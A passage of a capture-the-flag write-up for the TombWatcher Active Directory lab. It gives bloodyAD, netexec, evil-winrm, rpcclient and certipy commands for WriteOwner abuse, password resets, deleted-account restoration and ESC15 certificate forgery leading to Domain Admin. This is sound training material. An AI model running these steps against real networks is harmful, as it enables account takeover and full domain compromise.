+<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">netexec</span> ldap <span class="dt">\</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a>dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>-u Sam <span class="dt">\</span></span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;Password123!&#39;</span></span></code></pre></div>
+<p>Successful authentication confirms account takeover.</p>
+<hr />
+<h1 id="re-enumerate-bloodhound-2">Re-Enumerate BloodHound</h1>
+<p>With Sam compromised, another ACL edge became available.</p>
+<pre><code>Sam
+    │
+WriteOwner
+    │
+    ▼
+John</code></pre>
+<p>This introduces another common Active Directory abuse primitive.</p>
+<p>Ownership.</p>
+<hr />
+<h1 id="understanding-writeowner">Understanding WriteOwner</h1>
+<p>Object owners possess implicit authority over the object's permissions.</p>
+<p>Even if Sam lacks GenericAll today:</p>
+<pre><code>WriteOwner
+        │
+Become Owner
+        │
+Modify DACL
+        │
+Grant GenericAll
+        │
+Reset Password</code></pre>
+<p>This effectively turns ownership into full control.</p>
+<hr />
+<h1 id="key-takeaways-1">Key Takeaways</h1>
+<ul>
+<li>Re-enumerate BloodHound after <strong>every</strong> successful compromise.</li>
+<li>AddSelf is often underestimated but can inherit highly privileged rights.</li>
+<li>gMSA accounts are designed to resist password cracking; passing the hash is usually the intended path.</li>
+<li>ForceChangePassword provides immediate account compromise without requiring the current password.</li>
+<li>Ownership abuse frequently becomes GenericAll after modifying the object's ACL.</li>
+</ul>
+<hr />
+<h1 id="next-phase-1">Next Phase</h1>
+<p>The next stage abuses:</p>
+<pre><code>Sam
+    │
+WriteOwner
+    │
+John</code></pre>
+<p>to gain control of John, obtain a WinRM shell, enumerate Deleted Objects, restore <code>cert_admin</code>, and ultimately exploit AD CS ESC15 for Domain Administrator.</p>
+<h1 id="phase-5--sam--john">Phase 5 — Sam → John</h1>
+<h2 id="bloodhound-finding">BloodHound Finding</h2>
+<p>After compromising <strong>Sam</strong>, BloodHound identified another ACL-based privilege escalation path.</p>
+<pre><code>Sam
+    │
+WriteOwner
+    │
+    ▼
+John</code></pre>
+<p>Although Sam does not have GenericAll over John, ownership can be abused to grant additional permissions.</p>
+<hr />
+<h1 id="abuse-writeowner">Abuse WriteOwner</h1>
+<h2 id="step-1--take-ownership">Step 1 — Take Ownership</h2>
+<p>Transfer ownership of John's account to Sam.</p>
+<div class="sourceCode" id="cb42"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a>-u Sam <span class="dt">\</span></span>
+<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;Password123!&#39;</span> <span class="dt">\</span></span>
+<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a>set owner John Sam</span></code></pre></div>
+<p>Expected output:</p>
+<pre><code>[+] Owner changed successfully</code></pre>
+<hr />
+<h2 id="why-this-works">Why This Works</h2>
+<p>The owner of an Active Directory object is always permitted to modify that object's DACL.</p>
+<p>This means ownership can almost always be converted into full control.</p>
+<pre><code>WriteOwner
+      │
+Become Owner
+      │
+Modify ACL
+      │
+Grant GenericAll
+      │
+Reset Password</code></pre>
+<hr />
+<h2 id="step-2--grant-genericall">Step 2 — Grant GenericAll</h2>
+<p>Now that Sam owns John's object, grant full control.</p>
+<div class="sourceCode" id="cb45"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb45-4"><a href="#cb45-4" aria-hidden="true" tabindex="-1"></a>-u Sam <span class="dt">\</span></span>
+<span id="cb45-5"><a href="#cb45-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;Password123!&#39;</span> <span class="dt">\</span></span>
+<span id="cb45-6"><a href="#cb45-6" aria-hidden="true" tabindex="-1"></a>add genericAll John Sam</span></code></pre></div>
+<p>Expected:</p>
+<pre><code>[+] GenericAll successfully added</code></pre>
+<hr />
+<h2 id="step-3--reset-johns-password">Step 3 — Reset John's Password</h2>
+<p>With GenericAll established, reset the password.</p>
+<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="ex">bloodyAD</span> <span class="dt">\</span></span>
+<span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a>--host dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb47-3"><a href="#cb47-3" aria-hidden="true" tabindex="-1"></a>-d tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb47-4"><a href="#cb47-4" aria-hidden="true" tabindex="-1"></a>-u Sam <span class="dt">\</span></span>
+<span id="cb47-5"><a href="#cb47-5" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;Password123!&#39;</span> <span class="dt">\</span></span>
+<span id="cb47-6"><a href="#cb47-6" aria-hidden="true" tabindex="-1"></a>set password John <span class="st">&#39;NewPassword123!&#39;</span></span></code></pre></div>
+<p>Expected:</p>
+<pre><code>[+] Password changed successfully!</code></pre>
+<hr />
+<h1 id="verify-credentials-1">Verify Credentials</h1>
+<p>Always verify the new account.</p>
+<div class="sourceCode" id="cb49"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="ex">netexec</span> ldap <span class="dt">\</span></span>
+<span id="cb49-2"><a href="#cb49-2" aria-hidden="true" tabindex="-1"></a>dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb49-3"><a href="#cb49-3" aria-hidden="true" tabindex="-1"></a>-u John <span class="dt">\</span></span>
+<span id="cb49-4"><a href="#cb49-4" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;NewPassword123!&#39;</span></span></code></pre></div>
+<p>Successful authentication confirms complete control of John's account.</p>
+<hr />
+<h1 id="enumerate-smb-shares">Enumerate SMB Shares</h1>
+<p>The first step after obtaining a new account is to enumerate accessible shares.</p>
+<div class="sourceCode" id="cb50"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a><span class="ex">netexec</span> smb <span class="dt">\</span></span>
+<span id="cb50-2"><a href="#cb50-2" aria-hidden="true" tabindex="-1"></a>dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb50-3"><a href="#cb50-3" aria-hidden="true" tabindex="-1"></a>-u John <span class="dt">\</span></span>
+<span id="cb50-4"><a href="#cb50-4" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;NewPassword123!&#39;</span> <span class="dt">\</span></span>
+<span id="cb50-5"><a href="#cb50-5" aria-hidden="true" tabindex="-1"></a>--shares</span></code></pre></div>
+<p>Results:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Share</th>
+<th>Access</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>IPC$</td>
+<td>READ</td>
+</tr>
+<tr class="even">
+<td>NETLOGON</td>
+<td>READ</td>
+</tr>
+<tr class="odd">
+<td>SYSVOL</td>
+<td>READ</td>
+</tr>
+</tbody>
+</table>
+<p>Administrative shares are present but inaccessible.</p>
+<hr />
+<h1 id="notes-2">Notes</h1>
+<p>Enumeration of:</p>
+<ul>
+<li>NETLOGON</li>
+<li>SYSVOL</li>
+</ul>
+<p>did not reveal anything useful.</p>
+<p>Rather than spending additional time manually searching SMB shares, move to interactive access.</p>
+<hr />
+<h1 id="obtain-winrm-shell">Obtain WinRM Shell</h1>
+<p>John has WinRM access.</p>
+<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="ex">evil-winrm</span> <span class="dt">\</span></span>
+<span id="cb51-2"><a href="#cb51-2" aria-hidden="true" tabindex="-1"></a>-i 10.129.25.96 <span class="dt">\</span></span>
+<span id="cb51-3"><a href="#cb51-3" aria-hidden="true" tabindex="-1"></a>-u John <span class="dt">\</span></span>
+<span id="cb51-4"><a href="#cb51-4" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;NewPassword123!&#39;</span></span></code></pre></div>
+<p>Successful authentication provides an interactive PowerShell session.</p>
+<p>At this point the <strong>user flag</strong> can be collected.</p>
+<hr />
+<h1 id="local-enumeration">Local Enumeration</h1>
+<p>With interactive PowerShell access available, begin Active Directory enumeration from inside the domain.</p>
+<p>One interesting query is inspecting deleted Active Directory objects.</p>
+<div class="sourceCode" id="cb52"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ADObject</span> `</span>
+<span id="cb52-2"><a href="#cb52-2" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>Filter <span class="st">&#39;isDeleted -eq $true&#39;</span> `</span>
+<span id="cb52-3"><a href="#cb52-3" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>IncludeDeletedObjects `</span>
+<span id="cb52-4"><a href="#cb52-4" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>Properties <span class="op">*</span> <span class="op">|</span></span>
+<span id="cb52-5"><a href="#cb52-5" aria-hidden="true" tabindex="-1"></a><span class="fu">Format-List</span> Name<span class="op">,</span>ObjectGUID<span class="op">,</span>Deleted<span class="op">,</span>DistinguishedName</span></code></pre></div>
+<p>Interesting output:</p>
+<pre><code>cert_admin</code></pre>
+<p>appears multiple times inside the Deleted Objects container.</p>
+<hr />
+<h1 id="understanding-deleted-objects">Understanding Deleted Objects</h1>
+<p>Deleting an Active Directory object does <strong>not</strong> immediately remove it from the database.</p>
+<p>Instead:</p>
+<pre><code>Deleted User
+        │
+Tombstoned
+        │
+Stored in
+Deleted Objects
+        │
+Recoverable</code></pre>
+<p>If sufficient privileges exist, deleted objects may be restored.</p>
+<p>This creates an opportunity to recover previously privileged accounts.</p>
+<hr />
+<h1 id="phase-6--restore-cert_admin">Phase 6 — Restore cert_admin</h1>
+<p>From the deleted object list, select one of the ObjectGUID values.</p>
+<p>Restore the account.</p>
+<div class="sourceCode" id="cb55"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Restore-ADObject</span> `</span>
+<span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span></code></pre></div>
+<p>Expected:</p>
+<pre><code>Object restored successfully.</code></pre>
+<hr />
+<h1 id="reset-cert_admin-password">Reset cert_admin Password</h1>
+<p>Once restored, assign a known password.</p>
+<p>Using rpcclient:</p>
+<div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> 10.129.26.63 <span class="dt">\</span></span>
+<span id="cb57-2"><a href="#cb57-2" aria-hidden="true" tabindex="-1"></a>-U <span class="st">&#39;tombwatcher.htb\john&#39;</span></span></code></pre></div>
+<p>Within the rpcclient shell:</p>
+<pre class="text"><code>setuserinfo cert_admin 23 Password01!</code></pre>
+<p>This assigns a new password to the restored account.</p>
+<hr />
+<h1 id="verify-credentials-2">Verify Credentials</h1>
+<p>Confirm access.</p>
+<div class="sourceCode" id="cb59"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb59-1"><a href="#cb59-1" aria-hidden="true" tabindex="-1"></a><span class="ex">netexec</span> ldap <span class="dt">\</span></span>
+<span id="cb59-2"><a href="#cb59-2" aria-hidden="true" tabindex="-1"></a>dc01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb59-3"><a href="#cb59-3" aria-hidden="true" tabindex="-1"></a>-u cert_admin <span class="dt">\</span></span>
+<span id="cb59-4"><a href="#cb59-4" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;Password01!&#39;</span></span></code></pre></div>
+<p>Successful authentication confirms ownership of the restored account.</p>
+<hr />
+<h1 id="enumerate-active-directory-certificate-services">Enumerate Active Directory Certificate Services</h1>
+<p>The newly recovered account has certificate-related permissions.</p>
+<p>Begin by enumerating the Certificate Authority.</p>
+<div class="sourceCode" id="cb60"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb60-1"><a href="#cb60-1" aria-hidden="true" tabindex="-1"></a><span class="ex">certipy-ad</span> find <span class="dt">\</span></span>
+<span id="cb60-2"><a href="#cb60-2" aria-hidden="true" tabindex="-1"></a>-u cert_admin <span class="dt">\</span></span>
+<span id="cb60-3"><a href="#cb60-3" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;Password01!&#39;</span> <span class="dt">\</span></span>
+<span id="cb60-4"><a href="#cb60-4" aria-hidden="true" tabindex="-1"></a>-dc-ip 10.129.26.63 <span class="dt">\</span></span>
+<span id="cb60-5"><a href="#cb60-5" aria-hidden="true" tabindex="-1"></a>-vulnerable <span class="dt">\</span></span>
+<span id="cb60-6"><a href="#cb60-6" aria-hidden="true" tabindex="-1"></a>-output cert_admin_vuln</span></code></pre></div>
+<p>Interesting findings:</p>
+<pre><code>Template
+
+WebServer</code></pre>
+<p>BloodHound and Certipy identify:</p>
+<pre><code>ESC15</code></pre>
+<p>as exploitable.</p>
+<hr />
+<h1 id="understanding-esc15">Understanding ESC15</h1>
+<p>The vulnerable template allows:</p>
+<ul>
+<li>Enrollee Supplies Subject</li>
+<li>Schema Version 1</li>
+</ul>
+<p>This makes it possible to request a certificate for another user while supplying a malicious Application Policy.</p>
+<p>Effectively:</p>
+<pre><code>Request Certificate
+        │
+Supply Administrator UPN
+        │
+Inject Client Authentication
+        │
+Receive Valid Certificate
+        │
+Authenticate as Administrator</code></pre>
+<p>Unlike Kerberoasting or ACL abuse, no password is required.</p>
+<p>Possession of the certificate becomes equivalent to possessing Administrator credentials.</p>
+<hr />
+<h1 id="key-takeaways-2">Key Takeaways</h1>
+<ul>
+<li>Object ownership is frequently convertible into GenericAll.</li>
+<li>Always obtain an interactive shell if available after compromising a new account.</li>
+<li>Deleted Objects are often overlooked during Active Directory enumeration.</li>
+<li>Restoring deleted privileged users can expose entirely new attack paths.</li>
+<li>Certipy should always be used whenever certificate services are present.</li>
+</ul>
+<hr />
+<h1 id="next-phase-2">Next Phase</h1>
+<p>The final stage abuses:</p>
+<pre><code>cert_admin
+        │
+ESC15
+        │
+Administrator Certificate
+        │
+LDAP Shell
+        │
+Domain Admin</code></pre>
+<p>to obtain full domain compromise and capture the root flag.</p>
+<h1 id="phase-7--exploiting-esc15">Phase 7 — Exploiting ESC15</h1>
+<h2 id="bloodhound--certipy-finding">BloodHound / Certipy Finding</h2>
+<p>After restoring and taking control of <code>cert_admin</code>, Certipy identified the following vulnerable certificate template.</p>
+<pre><code>Template:
+WebServer
+
+Vulnerability:
+ESC15</code></pre>
+<p>Relevant characteristics:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Setting</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Enrollee Supplies Subject</td>
+<td>Enabled</td>
+</tr>
+<tr class="even">
+<td>Schema Version</td>
+<td>1</td>
+</tr>
+<tr class="odd">
+<td>Manager Approval</td>
+<td>Disabled</td>
+</tr>
+<tr class="even">
+<td>Authorized Signatures</td>
+<td>0</td>
+</tr>
+<tr class="odd">
+<td>Enrollable By</td>
+<td>cert_admin</td>
+</tr>
+</tbody>
+</table>
+<p>This template is vulnerable because it allows an attacker to request a certificate while supplying their own identity information.</p>
+<hr />
+<h1 id="understanding-esc15-1">Understanding ESC15</h1>
+<p>Unlike many AD CS attacks, ESC15 abuses <strong>Application Policies</strong>.</p>
+<p>Normally:</p>
+<pre><code>Certificate
+        │
+Server Authentication</code></pre>
+<p>With ESC15:</p>
+<pre><code>Certificate Request
+        │
+Inject Client Authentication EKU
+        │
+Administrator UPN
+        │
+Certificate Issued
+        │
+Authenticate as Administrator</code></pre>
+<p>No password is required.</p>
+<p>The certificate itself becomes the credential.</p>
+<hr />
+<h1 id="request-administrator-certificate">Request Administrator Certificate</h1>
+<p>Generate a certificate for the Administrator account.</p>
+<div class="sourceCode" id="cb68"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb68-1"><a href="#cb68-1" aria-hidden="true" tabindex="-1"></a><span class="ex">certipy-ad</span> req <span class="dt">\</span></span>
+<span id="cb68-2"><a href="#cb68-2" aria-hidden="true" tabindex="-1"></a>-u cert_admin <span class="dt">\</span></span>
+<span id="cb68-3"><a href="#cb68-3" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;Password01!&#39;</span> <span class="dt">\</span></span>
+<span id="cb68-4"><a href="#cb68-4" aria-hidden="true" tabindex="-1"></a>-dc-ip 10.129.26.63 <span class="dt">\</span></span>
+<span id="cb68-5"><a href="#cb68-5" aria-hidden="true" tabindex="-1"></a>-target DC01.tombwatcher.htb <span class="dt">\</span></span>
+<span id="cb68-6"><a href="#cb68-6" aria-hidden="true" tabindex="-1"></a>-ca <span class="st">&quot;tombwatcher-CA-1&quot;</span> <span class="dt">\</span></span>
+<span id="cb68-7"><a href="#cb68-7" aria-hidden="true" tabindex="-1"></a>-template WebServer <span class="dt">\</span></span>
+<span id="cb68-8"><a href="#cb68-8" aria-hidden="true" tabindex="-1"></a>-application-policies <span class="st">&quot;Client Authentication&quot;</span> <span class="dt">\</span></span>
+<span id="cb68-9"><a href="#cb68-9" aria-hidden="true" tabindex="-1"></a>-upn Administrator@tombwatcher.htb</span></code></pre></div>
+<p>Expected output:</p>
+<pre><code>administrator.pfx</code></pre>
+<p>The generated PFX contains:</p>
+<ul>
+<li>Private Key</li>
+<li>Administrator Certificate</li>
+</ul>
+<hr />
+<h1 id="authenticate-using-the-certificate">Authenticate Using the Certificate</h1>
+<p>Use the generated certificate instead of a password.</p>
+<div class="sourceCode" id="cb70"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb70-1"><a href="#cb70-1" aria-hidden="true" tabindex="-1"></a><span class="ex">certipy-ad</span> auth <span class="dt">\</span></span>
+<span id="cb70-2"><a href="#cb70-2" aria-hidden="true" tabindex="-1"></a>-pfx administrator.pfx <span class="dt">\</span></span>
+<span id="cb70-3"><a href="#cb70-3" aria-hidden="true" tabindex="-1"></a>-dc-ip 10.129.26.63 <span class="dt">\</span></span>
+<span id="cb70-4"><a href="#cb70-4" aria-hidden="true" tabindex="-1"></a>-ldap-shell</span></code></pre></div>
+<p>Successful authentication provides an interactive LDAP shell as <strong>Administrator</strong>.</p>
+<hr />
+<h1 id="why-ldap-shell">Why LDAP Shell?</h1>
+<p>Although Administrator authentication has already been achieved, the LDAP shell provides a convenient way to modify Active Directory objects directly.</p>
+<p>Rather than creating a new shell immediately, simply grant the already-compromised account elevated privileges.</p>
+<p>This avoids creating unnecessary credentials or additional persistence.</p>
+<hr />
+<h1 id="grant-domain-administrator">Grant Domain Administrator</h1>
+<p>Inside the LDAP shell:</p>
+<pre class="text"><code>add_user_to_group john &quot;Domain Admins&quot;</code></pre>
+<p>Expected:</p>
+<pre><code>Adding user:
+john
+
+to group:
+Domain Admins
+
+Result:
+OK</code></pre>
+<hr />
+<h1 id="grant-enterprise-administrator">Grant Enterprise Administrator</h1>
+<p>Also add John to Enterprise Admins.</p>
+<pre class="text"><code>add_user_to_group john &quot;Enterprise Admins&quot;</code></pre>
+<p>Expected:</p>
+<pre><code>Result:
+OK</code></pre>
+<hr />
+<h1 id="verify-group-membership">Verify Group Membership</h1>
+<p>Reconnect as John.</p>
+<div class="sourceCode" id="cb75"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb75-1"><a href="#cb75-1" aria-hidden="true" tabindex="-1"></a><span class="ex">evil-winrm</span> <span class="dt">\</span></span>
+<span id="cb75-2"><a href="#cb75-2" aria-hidden="true" tabindex="-1"></a>-i 10.129.26.63 <span class="dt">\</span></span>
+<span id="cb75-3"><a href="#cb75-3" aria-hidden="true" tabindex="-1"></a>-u John <span class="dt">\</span></span>
+<span id="cb75-4"><a href="#cb75-4" aria-hidden="true" tabindex="-1"></a>-p <span class="st">&#39;NewPassword123!&#39;</span></span></code></pre></div>
+<p>Once connected:</p>
+<div class="sourceCode" id="cb76"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb76-1"><a href="#cb76-1" aria-hidden="true" tabindex="-1"></a>whoami <span class="op">/</span>groups</span></code></pre></div>
+<p>Expected output now includes:</p>
+<pre><code>Domain Admins
+
+Enterprise Admins</code></pre>
+<p>This confirms successful privilege escalation.</p>
+<hr />
+<h1 id="capture-root-flag">Capture Root Flag</h1>
+<p>With Domain Administrator privileges established:</p>
+<div class="sourceCode" id="cb78"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb78-1"><a href="#cb78-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cd</span> C<span class="op">:</span>\Users\Administrator\Desktop</span>
+<span id="cb78-2"><a href="#cb78-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb78-3"><a href="#cb78-3" aria-hidden="true" tabindex="-1"></a><span class="fu">type</span> root<span class="op">.</span><span class="fu">txt</span></span></code></pre></div>
+<p>Root obtained.</p>
+<hr />
+<h1 id="complete-attack-chain">Complete Attack Chain</h1>
+<pre><code>Henry
+        │
+WriteSPN
+        │
+        ▼
+Alfred
+        │
+AddSelf
+        │
+        ▼
+Infrastructure
+        │
+ReadGMSAPassword
+        │
+        ▼
+ANSIBLE_DEV$
+        │
+ForceChangePassword
+        │
+        ▼
+Sam
+        │
+WriteOwner
+        │
+        ▼
+John
+        │
+Restore Deleted Object
+        │
+        ▼
+cert_admin
+        │
+ESC15
+        │
+Administrator Certificate
+        │
+LDAP Authentication
+        │
+        ▼
+Domain Administrator</code></pre>
+<hr />
+<h1 id="tools-used">Tools Used</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Nmap</td>
+<td>Service and port enumeration</td>
+</tr>
+<tr class="even">
+<td>BloodHound</td>
+<td>Active Directory attack path discovery</td>
+</tr>
+<tr class="odd">
+<td>bloodhound-python</td>
+<td>BloodHound data collection</td>
+</tr>
+<tr class="even">
+<td>bloodyAD</td>
+<td>ACL abuse and object manipulation</td>
+</tr>
+<tr class="odd">
+<td>Impacket GetUserSPNs</td>
+<td>Kerberoasting</td>
+</tr>
+<tr class="even">
+<td>Hashcat</td>
+<td>Offline password cracking</td>
+</tr>
+<tr class="odd">
+<td>NetExec</td>
+<td>Authentication verification, SMB, LDAP, gMSA extraction</td>
+</tr>
+<tr class="even">
+<td>Evil-WinRM</td>
+<td>Interactive PowerShell shell</td>
+</tr>
+<tr class="odd">
+<td>rpcclient</td>
+<td>Password reset</td>
+</tr>
+<tr class="even">
+<td>Certipy</td>
+<td>AD CS enumeration and exploitation</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="active-directory-primitives-used">Active Directory Primitives Used</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Primitive</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>WriteSPN</td>
+<td>Create fake SPN for Kerberoasting</td>
+</tr>
+<tr class="even">
+<td>Kerberoasting</td>
+<td>Recover Alfred's password</td>
+</tr>
+<tr class="odd">
+<td>AddSelf</td>
+<td>Join Infrastructure group</td>
+</tr>
+<tr class="even">
+<td>ReadGMSAPassword</td>
+<td>Retrieve managed service account hash</td>
+</tr>
+<tr class="odd">
+<td>ForceChangePassword</td>
+<td>Reset Sam's password</td>
+</tr>
+<tr class="even">
+<td>WriteOwner</td>
+<td>Take ownership of John's account</td>
+</tr>
+<tr class="odd">
+<td>GenericAll</td>
+<td>Full control over John</td>
+</tr>
+<tr class="even">
+<td>Restore-ADObject</td>
+<td>Recover deleted privileged account</td>
+</tr>
+<tr class="odd">
+<td>ESC15</td>
+<td>Obtain Administrator certificate</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="methodology-notes">Methodology Notes</h1>
+<p>Several themes emerged throughout this assessment.</p>
+<h3 id="1-let-bloodhound-drive-decisions">1. Let BloodHound Drive Decisions</h3>
+<p>Every privilege escalation originated from BloodHound.</p>
+<p>Rather than manually searching for vulnerabilities after each compromise, each newly obtained account was imported into the attack graph to identify the next ACL edge.</p>
+<p>This minimizes guesswork and produces a deterministic attack path.</p>
+<hr />
+<h3 id="2-re-enumerate-after-every-compromise">2. Re-Enumerate After Every Compromise</h3>
+<p>Each compromised identity exposed new permissions.</p>
+<pre><code>Henry
+
+↓
+
+Alfred
+
+↓
+
+ANSIBLE_DEV$
+
+↓
+
+Sam
+
+↓
+
+John
+
+↓
+
+cert_admin</code></pre>
+<p>Treat every account as a fresh starting point.</p>
+<hr />
+<h3 id="3-verify-every-action">3. Verify Every Action</h3>
+<p>Every privilege modification was immediately validated before continuing.</p>
+<p>Examples:</p>
+<ul>
+<li>Verify SPN creation</li>
+<li>Verify group membership</li>
+<li>Verify password resets</li>
+<li>Verify authentication</li>
+<li>Verify certificate issuance</li>
+<li>Verify administrator group membership</li>
+</ul>
+<p>Verification reduces confusion later in the engagement.</p>
+<hr />
+<h3 id="4-think-in-graphs-not-machines">4. Think in Graphs, Not Machines</h3>
+<p>This box contains almost no software exploitation.</p>
+<p>Every privilege escalation came from:</p>
+<ul>
+<li>Delegated permissions</li>
+<li>ACL abuse</li>
+<li>Trust relationships</li>
+<li>Object ownership</li>
+<li>Certificate Services</li>
+</ul>
+<p>Modern Active Directory assessments frequently resemble graph traversal problems more than traditional exploitation.</p>
+<hr />
+<h1 id="lessons-learned">Lessons Learned</h1>
+<ul>
+<li>BloodHound should be one of the first tools used whenever valid domain credentials are available.</li>
+<li>Small delegated permissions can often be chained into complete domain compromise.</li>
+<li>Always investigate object ownership, delegated ACLs, and group permissions before searching for software vulnerabilities.</li>
+<li>gMSA accounts should generally be treated as pass-the-hash opportunities rather than password cracking targets.</li>
+<li>Deleted Active Directory objects can expose privileged accounts that are easily overlooked.</li>
+<li>AD CS remains one of the highest-impact privilege escalation vectors in modern Active Directory environments.</li>
+</ul>
+<hr />
+<h1 id="summary">Summary</h1>
+<p>TombWatcher demonstrates how seemingly low-impact Active Directory permissions can be chained into full Domain Administrator compromise without exploiting a single software vulnerability.</p>
+<p>The entire attack path relies on understanding and abusing delegated permissions:</p>
+<ul>
+<li>ACL abuse</li>
+<li>Kerberoasting</li>
+<li>Group membership inheritance</li>
+<li>gMSA password retrieval</li>
+<li>Object ownership</li>
+<li>Deleted object recovery</li>
+<li>Active Directory Certificate Services</li>
+</ul>
+<p>This makes TombWatcher an excellent exercise in graph-based Active Directory privilege escalation and reinforces the importance of permission-centric enumeration during enterprise assessments.</p>
+
+</article>
+</main>
+<footer class="footer"><div class="container"><span>© 2026 Darrin Jackson</span></div></footer>
+<script src="/assets/js/site.js"></script></div></body></html>
